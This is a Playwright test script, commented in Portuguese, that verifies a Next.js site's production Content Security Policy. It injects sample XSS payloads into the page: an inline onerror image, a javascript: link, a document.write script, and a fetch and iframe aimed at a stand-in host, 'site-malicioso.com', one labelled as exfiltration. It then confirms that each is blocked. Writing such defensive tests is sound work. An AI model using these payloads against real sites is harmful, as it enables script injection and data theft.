import { chromium } from 'playwright-core';
/** CSP do BUILD de produção (next build + next start): nenhuma violação, o site funciona e o que não tem nonce é bloqueado. */
const SITE = process.env.SITE ?? 'http://localhost:3501';
const browser = await chromium.launch({ executablePath: process.env.CHROMIUM || undefined });
let falhas = 0, total = 0;
const ok = (c, m) => { total++; console.log((c ? 'ok   ' : 'FALHA') + ' ' + m); if (!c) falhas++; };
const ctx = await browser.newContext({ viewport: { width: 1200, height: 900 } });
await ctx.addInitScript(() => { document.addEventListener('securitypolicyviolation', (e) => { (window.__csp ??= []).push(e.violatedDirective + ' ← ' + e.blockedURI.slice(0, 60)); }); });
const p = await ctx.newPage();
const erros = []; p.on('pageerror', (e) => erros.push(e.message.slice(0, 120))); p.on('console', (m) => { if (m.type() === 'error' && !/401|Failed to load resource/.test(m.text())) erros.push(m.text().slice(0, 120)); });
const paginas = ['/pt', '/en', '/pt/materias', '/pt/categoria/raids', '/pt/perguntas', '/pt/entrar', '/pt/cadastro'];
let viol = [];
for (const r of paginas) { await p.goto(SITE + r); await p.waitForLoadState('networkidle'); await p.waitForTimeout(300); viol.push(...(await p.evaluate(() => window.__csp ?? []))); }
ok(viol.length === 0, 'CSP de produção: nenhuma violação em ' + paginas.length + ' páginas' + (viol.length ? ' → ' + [...new Set(viol)].slice(0, 4).join(' | ') : ''));
ok(erros.length === 0, 'nenhum erro de JavaScript' + (erros.length ? ' → ' + erros.slice(0, 3).join(' | ') : ''));

// o site está "vivo" (hidratou): o botão de tema troca o tema, e o menu de idioma navega
await p.goto(SITE + '/pt'); await p.waitForLoadState('networkidle');
const antes = await p.evaluate(() => document.documentElement.getAttribute('data-tema'));
await p.click('button[aria-label="Alternar tema"]'); await p.waitForTimeout(300);
const depois = await p.evaluate(() => document.documentElement.getAttribute('data-tema'));
ok(depois !== antes && !!depois, 'JavaScript roda sob a CSP: o botão de tema funciona (' + (antes ?? 'sistema') + ' → ' + depois + ')');
await p.click('a[hreflang="en"]'); await p.waitForURL('**/en', { timeout: 8000 });
ok(true, 'e a navegação entre idiomas funciona (hidratação ok)');

// a CSP realmente BLOQUEIA injeção de marcação (é assim que um XSS acontece: HTML colado num campo que acaba na página)
await p.goto(SITE + '/pt'); await p.waitForLoadState('networkidle');
const r = await p.evaluate(async () => {
  window.__atacou = false;
  // 1) manipulador de evento inline (<img onerror=...>), o XSS mais comum
  document.body.insertAdjacentHTML('beforeend', '<img id="xss1" src="/imagem-que-nao-existe.png" onerror="window.__atacou=true">');
  // 2) link javascript: clicado
  document.body.insertAdjacentHTML('beforeend', '<a id="xss2" href="javascript:window.__atacou=true">x</a>');
  document.getElementById('xss2').click();
  // 3) imagem de host não permitido
  const i = document.createElement('img'); i.src = 'https://site-malicioso.com/x.png'; document.body.appendChild(i);
  // 4) envio de dados para fora
  let vazou = 'nao';
  try { await fetch('https://site-malicioso.com/coleta', { mode: 'no-cors' }); vazou = 'sim'; } catch { vazou = 'nao'; }
  // 5) iframe de fora
  const f = document.createElement('iframe'); f.src = 'https://site-malicioso.com'; document.body.appendChild(f);
  await new Promise((ok) => setTimeout(ok, 800));
  return { executou: window.__atacou, vazou, violacoes: window.__csp ?? [] };
});
ok(r.executou === false, 'XSS por marcação (onerror inline e link javascript:) injetada na página: NÃO executa');
ok(r.vazou === 'nao', 'fetch para um servidor de fora (exfiltração de dados): bloqueado');
const dirs = r.violacoes.map((v) => v.split(' ')[0]);
ok(['script-src-attr', 'script-src', 'img-src', 'connect-src', 'frame-src'].every((d) => dirs.some((x) => x.startsWith(d))), 'o navegador registrou as violações (' + [...new Set(dirs)].join(', ') + ')');
// 6) <script> inserido pelo PARSER sem nonce (document.write reanalisa HTML como se viesse do servidor)
const r2 = await p.evaluate(async () => {
  window.__atacou2 = false;
  document.write('<script>window.__atacou2 = true<\\/script>');
  document.close();
  await new Promise((ok) => setTimeout(ok, 300));
  return window.__atacou2;
});
ok(r2 === false, '<script> inline sem nonce inserido pelo parser: NÃO executa');

// o site não pode ser embutido em iframe de outro site (clickjacking)
const outra = await ctx.newPage();
await outra.setContent('<iframe id="f" src="' + SITE + '/pt" width="600" height="400"></iframe>');
await outra.waitForTimeout(2500);
const embutido = await outra.evaluate(() => { const f = document.getElementById('f'); try { return f.contentDocument?.body?.innerText?.length ?? -1; } catch { return -2; } });
ok(embutido <= 0, 'o site NÃO abre dentro de um iframe de outro endereço (frame-ancestors none + X-Frame-Options)');

await browser.close();
console.log('\n' + (falhas ? falhas + ' FALHA(S) em ' + total : 'tudo certo: ' + total + ' verificações da CSP de produção passaram'));
process.exit(falhas ? 1 : 0);
